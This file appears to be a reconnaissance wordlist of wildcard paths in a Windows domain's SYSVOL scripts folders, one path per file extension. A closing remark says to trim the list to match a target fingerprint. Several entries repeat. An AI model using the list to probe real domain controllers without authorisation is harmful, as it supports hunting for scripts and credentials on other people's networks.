C:\Windows\SYSVOL\SYSVOL\*\scripts\*.img
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.vhd
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.vhdx
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.wim
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.esd
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.swm
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ppkg
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cab
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.msi
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.msp
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.msu
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.exe
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.dll
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.sys
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.drv
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ocx
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cpl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.scr
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.com
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.bat
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cmd
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ps1
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.psm1
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.psd1
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ps1xml
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.psc1
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cdxml
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.vbs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.vbe
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.js
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.jse
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.wsf
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.wsc
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.wsh
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.hta
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.asp
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.aspx
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.php
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.jsp
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cgi
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.pl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.py
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.rb
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.sh
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.bash
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.zsh
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ksh
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.csh
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.tcsh
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fish
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.awk
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.sed
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.tcl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.lua
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.groovy
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.scala
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.clj
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cljs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.edn
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.erl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.hrl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ex
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.exs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.hs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.lhs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ml
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.mli
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fsi
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fsx
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fsscript
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.r
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.R
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.rmd
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.Rmd
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.jl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.dart
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.go
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.rs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.swift
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.kt
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.kts
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.java
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.scala
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.groovy
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.clj
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.cljs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.edn
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.erl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.hrl
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ex
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.exs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.hs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.lhs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.ml
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.mli
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fs
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fsi
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fsx
C:\Windows\SYSVOL\SYSVOL\*\scripts\*.fsscript
```

The Windows list is deliberately exhaustive-ish — trim to what the
fingerprint suggests — `windows-paths.md` is the curated version.
